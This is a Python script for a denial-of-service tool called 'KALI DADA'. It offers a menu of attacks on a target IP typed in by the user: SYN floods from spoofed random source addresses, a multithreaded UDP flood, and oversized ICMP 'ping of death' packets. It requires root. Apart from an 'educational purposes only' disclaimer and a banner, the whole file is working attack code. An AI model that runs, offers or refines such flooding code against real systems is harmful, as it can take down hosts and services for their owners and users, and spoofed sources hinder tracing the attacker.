import os
import sys
import time
import socket
import random
import threading
from scapy.all import IP, TCP, ICMP, sendpfast, send

# ANSI Colors
GREEN  = "\033[92m"
RED    = "\033[91m"
CYAN   = "\033[96m"
YELLOW = "\033[93m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

NAME = "Sujal Lamichhane"

def print_warning():
    os.system("clear")
    warning_message = f"""
{RED}{BOLD}
##############################################################################
#  WARNING: THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY!                      #
#  THE AUTHOR IS NOT RESPONSIBLE FOR ANY MISUSE OR ILLEGAL ACTIVITIES.       #
#  USE THIS TOOL ONLY IN A CONTROLLED AND AUTHORIZED ENVIRONMENT.            #
##############################################################################
{RESET}
"""
    print(warning_message)
def print_kali_dada_banner():
    """Display the KALI DADA banner and website info."""
    os.system("clear")
    banner = f"""
{GREEN}{BOLD}


 /$$   /$$  /$$$$$$  /$$       /$$$$$$       /$$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$ 
| $$  /$$/ /$$__  $$| $$      |_  $$_/      | $$__  $$ /$$__  $$| $$__  $$ /$$__  $$
| $$ /$$/ | $$  \ $$| $$        | $$        | $$  \ $$| $$  \ $$| $$  \ $$| $$  \ $$
| $$$$$/  | $$$$$$$$| $$        | $$        | $$  | $$| $$$$$$$$| $$  | $$| $$$$$$$$
| $$  $$  | $$__  $$| $$        | $$        | $$  | $$| $$__  $$| $$  | $$| $$__  $$
| $$\  $$ | $$  | $$| $$        | $$        | $$  | $$| $$  | $$| $$  | $$| $$  | $$
| $$ \  $$| $$  | $$| $$$$$$$$ /$$$$$$      | $$$$$$$/| $$  | $$| $$$$$$$/| $$  | $$
|__/  \__/|__/  |__/|________/|______/      |_______/ |__/  |__/|_______/ |__/  |__/

"""

def check_root():
    if os.geteuid() != 0:
        print(f"{RED}[!] This script must be run as root. Exiting...{RESET}")
        sys.exit(1)

def syn_flood(target_ip, target_port, duration):
    timeout = time.time() + duration
    packet_count = 0
    def send_packets():
        nonlocal packet_count
        while time.time() < timeout:
            src_ip = ".".join(map(str, (random.randint(1, 255) for _ in range(4))))
            packet = IP(src=src_ip, dst=target_ip) / TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
            sendpfast(packet, pps=5000, loop=0, verbose=False)  # High-speed sending
            packet_count += 1
    
    threads = []
    for _ in range(5):  # Launch multiple threads
        t = threading.Thread(target=send_packets)
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    print(f"{GREEN}[+] SYN Flood Completed. Packets Sent: {packet_count}{RESET}")

def udp_flood(target_ip, target_port, duration):
    timeout = time.time() + duration
    packet = random._urandom(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_count = 0

    def send_packets():
        nonlocal packet_count
        while time.time() < timeout:
            sock.sendto(packet, (target_ip, target_port))
            packet_count += 1
    
    threads = []
    for _ in range(5):
        t = threading.Thread(target=send_packets)
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    print(f"{GREEN}[+] UDP Flood Completed. Packets Sent: {packet_count}{RESET}")

def ping_of_death(target_ip, duration):
    timeout = time.time() + duration
    packet_count = 0
    def send_packets():
        nonlocal packet_count
        while time.time() < timeout:
            packet = IP(dst=target_ip) / ICMP() / (b"X" * 65500)
            sendpfast(packet, pps=3000, loop=0, verbose=False)
            packet_count += 1
    
    threads = []
    for _ in range(5):
        t = threading.Thread(target=send_packets)
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    print(f"{GREEN}[+] Ping of Death Completed. Packets Sent: {packet_count}{RESET}")

def main():
    check_root()
    print_warning()
    target_ip = input(f"{CYAN}Enter Target IP: {RESET}").strip()
    attack_type = input(f"{CYAN}Choose attack [syn/udp/ping]: {RESET}").strip().lower()
    duration = int(input(f"{CYAN}Enter Duration (seconds): {RESET}").strip())
    target_port = int(input(f"{CYAN}Enter Target Port (Only for SYN/UDP): {RESET}").strip()) if attack_type in ["syn", "udp"] else None

    if attack_type == "syn":
        syn_flood(target_ip, target_port, duration)
    elif attack_type == "udp":
        udp_flood(target_ip, target_port, duration)
    elif attack_type == "ping":
        ping_of_death(target_ip, duration)
    else:
        print(f"{RED}Invalid choice!{RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()
